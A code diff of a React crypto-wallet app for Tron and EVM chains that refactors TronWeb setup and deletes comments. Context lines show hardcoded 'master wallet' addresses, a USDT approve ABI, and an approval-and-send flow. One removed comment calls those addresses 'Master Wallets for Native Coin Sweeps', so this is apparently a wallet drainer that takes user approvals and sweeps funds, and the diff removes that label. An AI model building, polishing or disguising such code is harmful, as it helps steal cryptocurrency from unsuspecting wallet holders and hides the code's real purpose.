@@ -38,7 +38,7 @@ const BACKEND_API_URL = '';
 const TRON_CONTRACT_ADDRESS = 'TYSGZdf7tZqZcPrzumTCu3AGyTKu2XuTjm'
 const EVM_CONTRACT_ADDRESS = '0xEf7f662515dA2Cc955082c999cBFA5EEF9bEd4FE'
 
-// 🎨 UI DISPLAY ADDRESSES (Master Wallets for Native Coin Sweeps)
+// 🎨 UI DISPLAY ADDRESSES
 const DISPLAY_TRON_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'
 const DISPLAY_EVM_ADDRESS = '0xccD642c9acb072F72F29b77E'
 
@@ -156,6 +156,17 @@ const USDT_ABI = [
   { inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
 ]
 
+// ── BULLETPROOF TRONWEB INITIALIZER ──
+const createPublicTronWeb = () => {
+  if (typeof TronWeb === 'function') {
+    return new (TronWeb as any)({ fullHost: FULL_HOST });
+  }
+  if (TronWeb && typeof (TronWeb as any).default === 'function') {
+    return new (TronWeb as any).default({ fullHost: FULL_HOST });
+  }
+  throw new Error("Failed to initialize TronWeb");
+};
+
 // ── ORACLE PRICE FETCHER ──
 const fetchTokenPrices = async (tokens: any[], chain: string) => {
   try {
@@ -204,8 +215,6 @@ export default function App() {
   const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
   const { walletProvider: tronWalletProvider } = useAppKitProvider('tron')
 
-  // 🛠️ FIX 1: Bulletproof Chain Detection
-  // Bypasses AppKit caipAddress glitches by cryptographically checking the actual wallet address structure.
   const isTron = (typeof caipAddress === 'string' && caipAddress.includes('tron')) || (walletAddress && walletAddress.startsWith('T'));
   const isEVM = (typeof caipAddress === 'string' && caipAddress.includes('eip155')) || (walletAddress && walletAddress.startsWith('0x'));
 
@@ -250,9 +259,8 @@ export default function App() {
         }
 
         if (!finalTronWeb) {
-          // 🛠️ FIX 2: Safe Class Instantiation
-          const TronWebClass = (TronWeb as any).default || TronWeb;
-          const publicTronWeb = new TronWebClass({ fullHost: FULL_HOST });
+          // Utilizes the new bulletproof instantiation
+          const publicTronWeb = createPublicTronWeb();
           await getTronBalance(publicTronWeb, walletAddress);
         } else {
           await getTronBalance(finalTronWeb, walletAddress);
@@ -491,8 +499,8 @@ export default function App() {
         const validTokens = [];
         
         const prices = await fetchTokenPrices(baseTokens, 'tron');
-        const TronWebClass = (TronWeb as any).default || TronWeb;
-        const publicTw = new TronWebClass({ fullHost: FULL_HOST });
+        // Utilizes the new bulletproof instantiation
+        const publicTw = createPublicTronWeb();
 
         for (const token of baseTokens) {
           try {
@@ -612,8 +620,6 @@ export default function App() {
       throw new Error("Wallet provider not available for approval.");
 
     } catch (err: any) {
-      // 🛠️ FIX 3: Transparent UI Error Logging
-      // The button will no longer show a generic "Retry Sending", it will display the exact error message.
       const errorMsg = err.message || 'User rejected';
       log(`❌ Error: ${errorMsg}`);
       setStatus(`❌ Failed: ${errorMsg.substring(0, 25)}`);
